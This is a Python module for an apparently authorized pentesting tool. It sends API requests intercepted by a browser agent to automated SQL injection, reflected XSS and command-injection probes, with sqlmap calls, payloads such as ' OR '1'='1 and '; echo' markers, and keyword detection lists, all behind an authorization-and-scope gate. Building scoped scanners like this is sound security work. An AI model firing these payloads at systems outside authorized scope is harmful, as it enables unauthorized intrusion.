"""
core/autonomous_hunter.py
=========================
Autonomous Exploit Handover Engine.

Receives intercepted API requests from the Browser Agent, persists them to
``data/intercepted_api.json``, pushes relevant metadata to Vector Memory, and
triggers targeted proof-of-concept exploitation attempts (SQLi, XSS, Command
Injection) against the intercepted parameters.

SAFETY & GOVERNANCE
-------------------
* ``trigger_exploit`` refuses to run unless explicit authorization is present:
  ``HUNTER_AUTHORIZED=1`` environment variable **AND** the target host appears in
  ``AUTHORIZATION.txt`` scope.
* Proof-of-concept only: it confirms injection potential; it does NOT exfiltrate
  data, dump databases, or execute arbitrary commands on the target.
* ``sqlmap`` (if installed) is invoked in safe mode: ``--batch --level 1 --risk 1``.
* All network functions are behind try/except and return ``None`` on failure.
"""

from __future__ import annotations

import json
import os
import re
import subprocess
import urllib.parse
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import Any, Dict, List, Optional

INTERCEPTED_API_PATH = Path("data/intercepted_api.json")
SCOPE_FILE = Path("AUTHORIZATION.txt")


@dataclass
class InterceptedAPI:
    url: str
    method: str
    headers: Dict[str, str]
    body: Optional[str]
    params: Dict[str, List[str]]
    source: str = "browser_agent"


@dataclass
class ExploitResult:
    param: str
    vuln_type: str
    evidence: str
    confirmed: bool
    payload_used: str
    command: Optional[str] = None


# ──────────────────────────────────────────────────────────────────────────
# Authorization & persistence
# ──────────────────────────────────────────────────────────────────────────

def load_scope() -> List[str]:
    """Load authorized targets from AUTHORIZATION.txt."""
    if not SCOPE_FILE.exists():
        return []
    targets: List[str] = []
    for line in SCOPE_FILE.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if line and not line.startswith("#"):
            targets.append(line.lower())
    return targets


def is_authorized(target_url: str) -> bool:
    """Fail-closed: requires env flag + host in AUTHORIZATION.txt scope."""
    if os.getenv("HUNTER_AUTHORIZED", "0").lower() not in ("1", "true", "yes"):
        return False
    scope = load_scope()
    if not scope:
        return False
    host = urllib.parse.urlparse(target_url).hostname or ""
    return any(s in host.lower() for s in scope)


def save_intercepted_api(api: InterceptedAPI, path: Path = INTERCEPTED_API_PATH) -> None:
    """Append intercepted request to intercepted_api.json (browser-agent handover log)."""
    path.parent.mkdir(parents=True, exist_ok=True)
    record = asdict(api)
    existing: List[Dict[str, Any]] = []
    if path.exists():
        try:
            loaded = json.loads(path.read_text(encoding="utf-8"))
            existing = loaded if isinstance(loaded, list) else [loaded]
        except Exception:
            existing = []
    existing.append(record)
    path.write_text(json.dumps(existing, indent=2, ensure_ascii=False), encoding="utf-8")


def push_to_vector_memory(api: InterceptedAPI, results: List[ExploitResult]) -> None:
    """
    Push intercepted request + exploit results to Vector Memory if available.
    Fail-soft: vector memory is optional.
    """
    try:
        from memory.structured.index import MemoryIndex  # type: ignore
        idx = MemoryIndex()
        idx.add(
            id=f"intercepted_{abs(hash(api.url + api.method))}",
            text=f"{api.method} {api.url} params={api.params} findings={[r.vuln_type for r in results]}",
            metadata={
                "source": api.source,
                "url": api.url,
                "method": api.method,
                "params": api.params,
                "findings": [asdict(r) for r in results],
            },
        )
    except Exception:
        # Vector memory not configured — continue without it.
        pass


# ──────────────────────────────────────────────────────────────────────────
# Parsing
# ──────────────────────────────────────────────────────────────────────────

def parse_api_data(raw: Dict[str, Any]) -> InterceptedAPI:
    url = raw.get("url", "")
    method = str(raw.get("method", "GET")).upper()
    headers = raw.get("headers", {}) or {}
    body = raw.get("body")

    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if body:
        try:
            body_q = urllib.parse.parse_qs(body, keep_blank_values=True)
            query = {**query, **body_q}
        except Exception:
            pass

    return InterceptedAPI(
        url=url,
        method=method,
        headers=headers,
        body=body,
        params=query,
        source=raw.get("source", "browser_agent"),
    )


# ──────────────────────────────────────────────────────────────────────────
# Local detection heuristics (no network)
# ──────────────────────────────────────────────────────────────────────────

def looks_like_sqli(param: str, value: str) -> bool:
    triggers = ["'", '"', "--", ";", "union", "select", "sleep(", "benchmark(", "1=1"]
    blob = f"{param}={value}".lower()
    return any(t in blob for t in triggers)


def looks_like_xss(param: str, value: str) -> bool:
    triggers = ["<script", "onerror=", "onload=", "alert(", "javascript:", "<img", "<svg"]
    return any(t in value.lower() for t in triggers)


def looks_like_cmdi(param: str, value: str) -> bool:
    triggers = [";", "&&", "||", "|", "`", "$(", "${"]
    return any(t in value for t in triggers)


# ──────────────────────────────────────────────────────────────────────────
# Exploit engines (proof-of-concept, no data exfiltration)
# ──────────────────────────────────────────────────────────────────────────

def run_sqlmap(url: str, param: str, method: str, body: Optional[str] = None) -> Optional[ExploitResult]:
    """Safe sqlmap probe (batch, level 1, risk 1). Returns result if injectable."""
    try:
        cmd = [
            "sqlmap", "-u", url, "-p", param,
            "--method", method,
            "--batch", "--level", "1", "--risk", "1",
            "--flush-session",
            "--output-dir=/tmp/sqlmap_out",
        ]
        if method == "POST" and body:
            cmd += ["--data", body]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        output = (proc.stdout + proc.stderr).lower()
        injectable = any(k in output for k in ["injectable", "parameter", "sql injection"])
        if injectable:
            return ExploitResult(
                param=param,
                vuln_type="SQLi (sqlmap)",
                evidence=(proc.stdout + proc.stderr)[:500],
                confirmed=True,
                payload_used="sqlmap automated",
                command=" ".join(cmd),
            )
    except FileNotFoundError:
        pass
    except Exception:
        pass
    return None


def boolean_blind_sqli(url: str, param: str, method: str, headers: Dict[str, str], body: Optional[str] = None) -> Optional[ExploitResult]:
    """Custom boolean-based blind SQLi probe (no data exfiltration)."""
    try:
        import requests  # type: ignore
    except Exception:
        return None

    def send(val: str) -> Optional[str]:
        try:
            kwargs: Dict[str, Any] = {"headers": headers, "timeout": 10, "allow_redirects": False}
            if method == "POST":
                kwargs["data"] = {param: val}
            else:
                kwargs["params"] = {param: val}
            resp = requests.request(method, url, **kwargs)
            return resp.text
        except Exception:
            return None

    try:
        true_resp = send("' OR '1'='1")
        false_resp = send("' OR '1'='2")
        if true_resp is not None and false_resp is not None and true_resp != false_resp:
            return ExploitResult(
                param=param,
                vuln_type="SQLi (boolean-based blind)",
                evidence=f"Different responses for true/false payloads on '{param}'",
                confirmed=True,
                payload_used="' OR '1'='1",
            )
    except Exception:
        pass
    return None


def reflected_xss(url: str, param: str, method: str, headers: Dict[str, str], body: Optional[str] = None) -> Optional[ExploitResult]:
    try:
        import requests  # type: ignore
    except Exception:
        return None

    payload = "<script>alert(1)</script>"
    try:
        kwargs: Dict[str, Any] = {"headers": headers, "timeout": 10}
        if method == "POST":
            resp = requests.post(url, data={param: payload}, **kwargs)
        else:
            resp = requests.get(url, params={param: payload}, **kwargs)
        if payload in resp.text:
            return ExploitResult(
                param=param,
                vuln_type="XSS (reflected)",
                evidence=f"Payload reflected in response: {payload}",
                confirmed=True,
                payload_used=payload,
            )
    except Exception:
        pass
    return None


def command_injection(url: str, param: str, method: str, headers: Dict[str, str], body: Optional[str] = None) -> Optional[ExploitResult]:
    """PoC-only: checks if shell metacharacters are reflected unsafely. Does NOT execute commands."""
    try:
        import requests  # type: ignore
    except Exception:
        return None

    test_val = "test; echo __POC_MARKER__"
    try:
        kwargs: Dict[str, Any] = {"headers": headers, "timeout": 10}
        if method == "POST":
            resp = requests.post(url, data={param: test_val}, **kwargs)
        else:
            resp = requests.get(url, params={param: test_val}, **kwargs)
        if "__POC_MARKER__" in resp.text:
            return ExploitResult(
                param=param,
                vuln_type="Command Injection (potential)",
                evidence=f"Shell metacharacter sequence reflected: {test_val}",
                confirmed=True,
                payload_used=test_val,
            )
    except Exception:
        pass
    return None


# ──────────────────────────────────────────────────────────────────────────
# Main entry point
# ──────────────────────────────────────────────────────────────────────────

def trigger_exploit(api_data: Dict[str, Any], authorized: bool = False) -> List[ExploitResult]:
    """
    Automated exploit handover from Browser Agent.

    Parameters
    ----------
    api_data : dict
        Intercepted request: {url, method, headers, body, source}
    authorized : bool
        Must be True (or HUNTER_AUTHORIZED=1) AND target in AUTHORIZATION.txt scope.

    Returns
    -------
    List[ExploitResult]
        Confirmed/potential findings (PoC only).
    """
    if not authorized:
        authorized = is_authorized(api_data.get("url", ""))
    if not authorized:
        raise PermissionError(
            "trigger_exploit requires explicit authorization. "
            "Set HUNTER_AUTHORIZED=1 and ensure the target host is listed in AUTHORIZATION.txt scope."
        )

    api = parse_api_data(api_data)
    save_intercepted_api(api)

    results: List[ExploitResult] = []

    for param, values in api.params.items():
        value = values[0] if values else ""

        # SQLi
        if looks_like_sqli(param, value):
            r = run_sqlmap(api.url, param, api.method, api.body)
            if not r:
                r = boolean_blind_sqli(api.url, param, api.method, api.headers, api.body)
            if r:
                results.append(r)
                continue

        # XSS
        if looks_like_xss(param, value):
            r = reflected_xss(api.url, param, api.method, api.headers, api.body)
            if r:
                results.append(r)

        # Command Injection
        if looks_like_cmdi(param, value):
            r = command_injection(api.url, param, api.method, api.headers, api.body)
            if r:
                results.append(r)

    push_to_vector_memory(api, results)
    return results


# ──────────────────────────────────────────────────────────────────────────
# Browser Agent → Exploit Engine integration hook
# ──────────────────────────────────────────────────────────────────────────

def on_browser_intercept(intercepted_request: Dict[str, Any], authorized: bool = False) -> List[ExploitResult]:
    """
    Call this from BrowserAgent whenever it intercepts an API call containing
    user-controlled parameters (e.g. POST /api/v2/query?q=hunter_probe).
    """
    print(f"[BrowserAgent→Exploit] Intercepted {intercepted_request.get('method')} {intercepted_request.get('url')}")
    return trigger_exploit(intercepted_request, authorized=authorized)


if __name__ == "__main__":
    print("SIMULATION MODE — no network exploitation against real targets.")
    sample = {
        "url": "https://example.local/api/v2/query?q=hunter_probe",
        "method": "GET",
        "headers": {"Content-Type": "application/json"},
        "body": None,
        "source": "browser_agent",
    }
    print(f"Sample intercepted API: {sample['url']}")
    print("Call: trigger_exploit(sample, authorized=True)")
    print("Authorization gate blocks execution unless HUNTER_AUTHORIZED=1 + scope match.")
